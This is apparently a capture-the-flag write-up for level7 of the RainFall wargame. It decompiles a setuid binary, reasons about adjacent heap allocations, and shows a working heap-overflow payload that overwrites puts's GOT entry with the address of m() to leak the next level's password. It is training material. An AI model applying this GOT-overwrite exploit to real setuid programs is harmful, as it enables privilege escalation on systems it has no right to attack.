```
level7@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```

Let's decompile this.
```
undefined4 main(undefined4 placeholder_0, char **argv)
{
    undefined4 *puVar1;
    undefined4 uVar2;
    undefined4 *puVar3;
    char *size;
    FILE *stream;
    void **var_ch;
    void **var_8h;
    
    puVar1 = (undefined4 *)malloc(8);
    *puVar1 = 1;
    uVar2 = malloc(8);
    puVar1[1] = uVar2;
    puVar3 = (undefined4 *)malloc(8);
    *puVar3 = 2;
    uVar2 = malloc(8);
    puVar3[1] = uVar2;
    strcpy(puVar1[1], argv[1]);
    strcpy(puVar3[1], argv[2]);
    uVar2 = fopen("/home/user/level8/.pass", data.080486e9);
    fgets(c, 0x44, uVar2);
    puts(data.08048703);
    return 0;
}

void m(void)
{
    undefined4 uVar1;
    int32_t var_18h;
    time_t var_14h;
    
    uVar1 = time(0);
    printf("%s - %d\n", c, uVar1);
    return;
}
```

So what do we see here ?
We see that there are some linked list, and because they are created next to each other, we can easily overflow all of them.
What is the goal ?
Same as the two last exercises, first the GOT, next the overflow.
When we read the code, we see that there is a puts, it is completly useless, and we see that in the global 'c', the whole file is written.
Let's try to change the Goat so that the code calls to our m() function instead of puts.
So we have 4 mallocs of 8,
8 * 4 = 32, but we have some header, 2 to be precise, (the two of the linked list)
32 + 16 = 48.
when we do the first strcpy, we give the 0 + 8, and what we want is for the second strcpy, which is 16, bytes further, we want it's pointer,
to be on the m() function, so we have to add half a pointer (you know the first part is the value 2, the second is the pointer).
so in total we have to skip 20 bytes.
let's prepare everything.
```
level7@RainFall:~$ objdump -R ./level7 

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```
GOT adress = 08049928
```
level7@RainFall:~$ gdb ./level7
(gdb) p m
0x80484f4
```
and m adress: 0x80484f4
```
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
<hidden>
- 1769098777
```
And Gg you have the flag


